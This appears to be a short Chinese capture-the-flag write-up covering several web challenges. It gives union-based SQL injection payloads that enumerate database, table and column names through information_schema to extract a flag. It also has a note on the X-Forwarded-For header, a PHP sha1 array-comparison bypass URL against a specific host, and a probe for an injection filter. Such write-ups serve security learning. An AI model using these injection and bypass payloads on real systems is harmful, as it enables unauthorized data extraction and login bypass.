成绩单

考察SQL注入，使用sqlmap
判断回显字段，id=1' order by 4#回显正常，id=1' order by 5#回显异常，说明存在4个字段
id=0' union select 1,2,3,GROUP_CONCAT(schema_name) from information_schema.schemata# 获得所有数据库名
id=0' union select 1,2,3,GROUP_CONCAT(table_name) from information_schema.tables where table_schema='skctf_flag'#获得目标数据库所有表名
id=0' union select 1,2,3,GROUP_CONCAT(column_name) from information_schema.columns where table_name='fl4g'# 获得目标表所有列名
id=0' union select 1,2,3, skctf_flag from fl4g# 得到flag

你从哪里来

“X-Forwarded-For：简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项。”

各种绕过

分析源代码，要求id=margin，uname和passwd不相等，但sha1函数处理后相等
因为sha1()函数无法处理数组类型，并且将报错并返回false，从而满足if条件实现绕过
payload：http://123.206.87.240:8002/web7/?id=margin&uname[]=0

多次

更换不同的id显示不同的页面，添加单引号页面报错，存在注入点

?id=1’^(length(‘union’)!=0)–+

当union没被过滤时1^1 输出id=0
